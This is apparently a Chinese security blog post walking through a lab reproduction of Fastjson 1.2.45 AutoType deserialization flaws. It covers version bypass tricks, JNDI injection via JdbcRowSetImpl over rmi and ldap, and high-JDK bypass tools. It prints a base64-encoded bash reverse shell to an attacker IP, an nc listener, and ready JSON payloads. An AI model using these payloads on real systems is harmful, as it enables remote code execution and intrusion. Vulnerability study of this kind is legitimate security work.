---
title: Fastjson漏洞复现上
url: https://mp.weixin.qq.com/s/GpHSIDyccZ71fPSbvVy_0g
source: Doonsec's feed
date: 2026-04-06
fetch_date: 2026-04-07T04:28:41.896184
---

# Fastjson漏洞复现上

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXu4hqTGusIyYRAeFWRJHknkfkcmD29sRQibbShJOvaDkoyT5FPVicp1sZ6Y3xEttNoIzdSdvBXnyLhuuPWVeLhSYOIx6nddy6d04/0?wx_fmt=jpeg)

# Fastjson漏洞复现上

web安全小白
web安全小白

web安全小白

![]()

在小说阅读器中沉浸阅读

## 基础概念

**「1.什么是 JSON？」**

JSON全称 JavaScript Object Notation。

是一种轻量级的数据交换格式，采用键值对方式组织数据。

本质上就是一个字符串，便于在网络间传输和存储。

**「2. 什么是 Fastjson？」**

由阿里巴巴开源的 Java JSON 解析库。

主要提供两大功能：

序列化：将 Java 对象转换为 JSON 字符串。

反序列化：将 JSON 字符串还原为 Java 对象。

**「3. 为什么会有漏洞？」**

* Fastjson 引入了 AutoType 机制，用于在序列化时通过 @type 字段记录类的完整名称。
* 反序列化时，Fastjson 会自动加载并实例化 @type 指定的类。
* 如果后端没有对 `@type` 内容进行严格过滤或校验，攻击者可以构造恶意类路径，诱导服务器加载并执行攻击代码，最终造成远程代码执行（RCE）。

**「一句话总结漏洞原理：」**

Fastjson 在反序列化时会自动执行 @type 指定类中的 setter / getter 方法。攻击者可利用恶意类（如JdbcRowSetImpl）触发 JNDI 注入、字节码加载或反射命令执行，从而实现远程代码执行。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXsjN1JDiajXTyfNBdnvFNFoBuso48UtPhob4I1ia3hxOc5W47nFY0k2gfAMYuDhz6Wb20WFZH7daVbvLhqBbScFbpK39CXc0gbeU/640?wx_fmt=webp&from=appmsg)

**「流量特征：」**

请求体中包含 @type 字段，并带有完整类路径。

请求头 Content-Type: application/json。

**「各 Fastjson 版本漏洞的核心特性与利用关键点：」**

| Fastjson 版本 | 漏洞核心特点 | 利用关键说明 |
| --- | --- | --- |
| **「1.2.24 及以下」** | 默认 AutoType 开启，无强黑名单 | 原生 `JdbcRowSetImpl` JNDI 注入可直接利用，RCE 稳定 |
| **「1.2.42」** | 黑名单首次引入但可绕过 | 需使用 `L` 前缀格式绕过黑名单校验（如 `Lcom.sun.rowset.JdbcRowSetImpl;`） |
| **「1.2.48」** | 引入基础白名单，但仍存在绕过 | 可通过双写类名（如 `com.sun.rowset.JdbcRowSetImpl` → `com.sun.rowset.JdbcRowSetImpl...`）绕过校验 |
| **「1.2.68」** | 原生利用链大幅受限 | 依赖 Shiro 等第三方漏洞组件联动，间接实现 RCE |
| **「1.2.83+」** | 基础防护已较为完善 | 原生链基本不可用，仅限小众、特定场景或配置缺陷下可触发 |

## FastJson 1.2.45

下载地址：https://github.com/lemono0/FastJsonParty

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXvqDDDjuZzIGplS7V47JgrUgwFGdbxdGEZ2ciabIEhtibsxscmb0gbvxLYl8hW83BticpibJgcrbc9xeicZcOqHjVYnzuU31Fm2xJ20/640?wx_fmt=webp&from=appmsg)

环境启动：

```
docker compose up -d
```

### 1245-jndi

**「示例漏洞：」**http://www.loveli.com.cn/see\_bug\_one?id=52

1.访问靶场后需要自己构造数据包进行漏洞复现

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXsddHibsovNxH6CZ1OYvPEAydrvVs9q4yJ1bshcnw9OgWqtr5Ke6ZTaXFhHKaIs3u0m0gcmzCldjcK1qKON9ZVCuVk8Penqhzms/640?wx_fmt=webp&from=appmsg)

2.数据包构造为JSON格式

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXuj1FoH38hAMx6KZmiaxf7Xxw4UpYqvuMDYtfnGogxO97ZicSQtEMoa4aHSg94zicQrfePlmFTqKdGfg5u7AY0biblAWRxuGG81tr4/640?wx_fmt=webp&from=appmsg)

3.进行Fastjson版本探测

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXvK5icC316Wv3l3LntiaGw2lbemVHoTISsmlkZzZzVR9fLLj4TPAvl8zJJn7I8J4KzAnF5crOX7jRvLJwWqOOATghypibDtiaW1qqY/640?wx_fmt=webp&from=appmsg)

3.通过探测可知版本为1.2.45

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXuVvN3hoyrZnLLMJPMKAUiaDTbZial7q24dKx5icZrEicBiavH63S6bRFAlGcl8gK3fibx6ItfRkib4IVZyf0Q1QTonbWat8iamLuBZia3k/640?wx_fmt=webp&from=appmsg)

4.进行出网测试

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXsnx7SZhUsWoFWYqRRVOvq3s4o2b6CzcfqOvOMT1JnPC8lTU49gq9EAOReRbVXHSILzD8F28WBiaMOzGJBFmKRVLEKLpROKNibN4/640?wx_fmt=webp&from=appmsg)

**「预期结果」**：

* 如果返回 `autoType is not support`：autoType 关闭，常规 JNDI 注入不可用
* 如果返回 500 或有 DNS 请求：autoType 开启，可使用 JNDI 注入

5.通过测试可知服务器是出网的

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXubJlicq10e6ziafEu1nFQoOowTjRfUNHib5LLicGUn8pODxLDCAbt1g3dd87Ed4lYjur2KKHbyGXorjib1wCTl3ShGpAKqKb9tdCCk/640?wx_fmt=webp&from=appmsg)

6.寻找poc进行漏洞利用

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXvfkPhNM55rk4p5Kp1jDAACM4YoFeGWHV5EibhDiaVgm9j9fHRm8oa6dWjrFFU1BIlwPficicUGAegSZDLBuianibuGRqJics3UMiaMvSc/640?wx_fmt=webp&from=appmsg)

7.服务器执行

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS41NC82NjYgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "192.168.241.54"
```

-C 需要执行的命令

-A 自己的服务器地址

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXvjDGkUK8o3UEBic0ucFs8ickANmFeVFLb1ufP7tschzGVuJaKbhE4slq9D2AV7kvUk8ic5kXjLJBNNkKIjLcd22nutEsh9Y6Y21I/640?wx_fmt=webp&from=appmsg)

8.服务器建立监听

```
nc -lvnp 666
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXv5FiamAmux9UC1VDG1B3f488s9Hhib9OOTP3CdQiaLJPYudx947tmEhv9taHUEJJkRZwpXyu2rB0GrTHlAibOiaCibiaa2QweNUXflJg/640?wx_fmt=webp&from=appmsg)

9.构造payload进行攻击

```
{    "a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://192.168.241.54:9527/kecntp",        "autoCommit":true    }}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXu1rVvp6xE6srvV4UbjHznicg8aVE9t7lV8O12libD6ySWJUmTTDh9Us6xOib8ME4N6oHfQ81q1NFgkvsIBCmKZDicPNRvTmq38IV4/640?wx_fmt=webp&from=appmsg)

### 1245-jdk8u342

**「Java版本限制」**

基于rmi的利用方式：适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前；

在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码；

基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前；

在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。

通过对比可知ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。

因为当前环境JNDI注入在JDK8u191之后受到了极大限制，所以这里需要绕过JDK高版本。

执行反弹shell命令

```
java -jar JNDIBypass.jar -a 192.168.241.54 -p 9527 -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS41NC82NjYgMD4mMQ==}|{base64,-d}|{bash,-i}|{base64,-d}|{bash,-i}"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXtlb3hC3Zh7dpibewbQmmBzRGZlSO5vZicE2oic59jbzIiaAyWTs76wXYPjyVSQVudNeEVjpLDN5ewwURwEJnPfYCGepbGRMr031FE/640?wx_fmt=webp&from=appmsg)

服务器建立监听

```
nc -lvnp 666
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bhDuGkpteXtk8kia8kvN1VKOk4o2AaJticC6XdIJSLM3pGvRsgS7Fv4ibM9cRatHn3lgF6xWiaicrxajtib0gia8ATEs2EbOq1RjXjxoUS9Wic9UEdM/640?wx_fmt=webp&from=appmsg)

构造payload进行攻击

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXvP6LUI4hVDIyA6zmlCuShYtjpag2zEl17EhIicerJqzpCf2G39VRibCbqiaUfcnIkC99aYUOl9zBlsjHQmOAuXKQDNz7Jic43icBHk/640?wx_fmt=webp&from=appmsg)

```
{    "a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"ldap://192.168.241.54:9527/ZQsef",        "autoCommit":true    }}
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HOYhLLAPjoSDgDMibs2RbMbMJVm5UVAOphOoJzAk90bhYQTsMHjiaeyLvL6YvfhlxthbcR1R5kYiakuKDUqWcfkmg/0?wx_fmt=png)

web安全小白

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HOYhLLAPjoSDgDMibs2RbMbMJVm5UVAOphOoJzAk90bhYQTsMHjiaeyLvL6YvfhlxthbcR1R5kYiakuKDUqWcfkmg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过